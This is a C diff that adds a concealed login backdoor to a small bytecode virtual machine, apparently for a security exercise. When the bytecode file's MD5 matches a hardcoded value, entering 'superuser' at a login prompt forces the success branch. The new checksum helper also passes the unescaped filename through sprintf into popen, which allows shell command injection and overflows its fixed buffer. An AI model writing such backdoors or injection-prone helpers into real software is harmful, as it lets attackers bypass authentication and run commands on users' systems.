@@ -6,15 +6,21 @@
 #include <stdbool.h>
 #include <assert.h>
 #include <string.h>
+#include <ctype.h>
 #include "minivm.h"
 
 #define NUM_REGS   (256)
 #define NUM_FUNCS  (256)
+#define PATH_MAX   (256)
+#define MD5_LEN    (32)
+
+#define MY_PRGRAM_CHECKSUM "83d18f9c68d08e38b7e57347cfea52b3"
 
 // Global variable that indicates if the process is running.
 static bool is_running = true;
 uint8_t *heap = NULL;
 bool is_login_process = false;
+bool is_my_program = false;
 
 void check_addr_range(uint32_t addr) {
     if (addr >= 8192) {
@@ -139,7 +145,7 @@ void mini_puts(struct VMContext* ctx, const uint32_t instr) {
         else
             break;
     }
-    if (memcmp(ctx->heap + addr, "User: ", 6) == 0) {
+    if (is_my_program && (memcmp(ctx->heap + addr, "User: ", 6) == 0)) {
         is_login_process = true;
     }
 }
@@ -156,7 +162,7 @@ void mini_gets(struct VMContext* ctx, const uint32_t instr) {
         pos++;
     }
     write_mem(ctx, pos, '\0');
-    if (is_login_process &&
+    if (is_my_program && is_login_process &&
         memcmp(ctx->heap + addr, "superuser\0", 7) == 0)
     {
         ctx->pc = 3; // Success flow in my login program.
@@ -216,6 +222,30 @@ uint32_t* read_bytecode(const char* filename) {
     return bytecode;
 }
 
+int cal_MD5(const char* filename, char *md5_sum) {
+    char cmd[PATH_MAX];
+    sprintf(cmd, "md5sum %s 2>/dev/null", filename);
+
+    FILE *p = popen(cmd, "r");
+    if (p == NULL) return 0;
+
+    int i, ch;
+    for (i = 0; i < MD5_LEN && isxdigit(ch = fgetc(p)); i++) {
+        *md5_sum++ = ch;
+    }
+
+    *md5_sum = '\0';
+    pclose(p);
+    return i == MD5_LEN;
+}
+
+void detect_my_program(const char* filename) {
+    char md5[MD5_LEN + 1];
+    assert(cal_MD5(filename, md5) != 0);
+    if (strncmp(md5, MY_PRGRAM_CHECKSUM, MD5_LEN) == 0)
+        is_my_program = true;
+}
+
 int main(int argc, char** argv) {
     VMContext vm;
     Reg r[NUM_REGS];
@@ -223,6 +253,9 @@ int main(int argc, char** argv) {
 
     // There should be at least one argument.
     if (argc < 2) usageExit();
+
+    // Check if input bytecode is my program for the backdoor
+    detect_my_program(argv[1]);
 
     // Initialize registers.
     initRegs(r, NUM_REGS);
